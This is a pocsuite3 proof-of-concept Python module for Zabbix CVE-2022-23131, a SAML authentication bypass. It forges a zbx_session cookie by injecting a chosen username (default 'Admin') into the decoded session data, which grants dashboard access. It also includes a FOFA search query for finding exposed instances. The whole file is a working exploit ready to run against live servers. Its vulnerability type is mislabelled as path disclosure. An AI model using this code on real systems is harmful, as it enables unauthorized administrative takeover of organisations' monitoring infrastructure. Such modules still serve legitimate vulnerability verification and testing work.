"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import re, base64, json
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '19'  
    author = ['PeiQi']
    name = 'Zabbix SAML身份绕过漏洞 CVE-2022-23131'
    vulType = VUL_TYPE.PATH_DISCLOSURE
    desc = '''Zabbix 是一个非常流行的开源监控平台，用于收集、集中和跟踪整个基础设施中的 CPU 负载和网络流量等指标。它与 Pandora FMS 和 Nagios 等解决方案非常相似。由于其受欢迎程度、功能和在大多数公司网络中的特权地位，Zabbix 是威胁参与者的高调目标。一家公共漏洞经纪人，一家专门从事安全漏洞获取的公司，也公开宣布了他们对该软件的兴趣。 
我们在 Zabbix 的客户端会话实现中发现了一个严重漏洞，该漏洞可能导致整个网络遭到破坏。在本文中，我们介绍了不同类型的会话存储，并讨论了实现安全的原因。然后，我们描述了我们在 Zabbix 中发现的漏洞的技术细节、其影响以及如何预防。让我们深入了解它！
    '''
    appPowerLink = 'http://www.grandage.cn/'
    appName = 'Zabbix'
    appVersion = 'Zabbix 开启SAML'
    fofa_dork = {'fofa': 'app="ZABBIX-监控系统" && body="saml"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["user"] = OptString("Admin", description='默认用户名')
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/')
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                zbx_session = json.loads(str(base64.b64decode(re.findall(r'zbx_session=(.*?);',resp.headers.get("Set-Cookie"))[0]), 'utf8'))
                zbx_session = base64.b64encode(json.dumps(dict(saml_data=dict(username_attribute=self.get_option("user")), sessionid=zbx_session["sessionid"], sign=zbx_session["sign"])).encode())
                if zbx_session:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url + "/zabbix.php?action=dashboard.view"
                    result['VerifyInfo']['zbx_user'] = self.get_option("user")
                    result['VerifyInfo']['zbx_session'] = zbx_session
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url.rstrip('/')
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                zbx_session = json.loads(str(base64.b64decode(re.findall(r'zbx_session=(.*?);',resp.headers.get("Set-Cookie"))[0]), 'utf8'))
                zbx_session = base64.b64encode(json.dumps(dict(saml_data=dict(username_attribute=self.get_option("user")), sessionid=zbx_session["sessionid"], sign=zbx_session["sign"])).encode())
                if zbx_session:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['zbx_user'] = self.get_option("user")
                    result['VerifyInfo']['zbx_session'] = zbx_session
        except Exception as ex:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)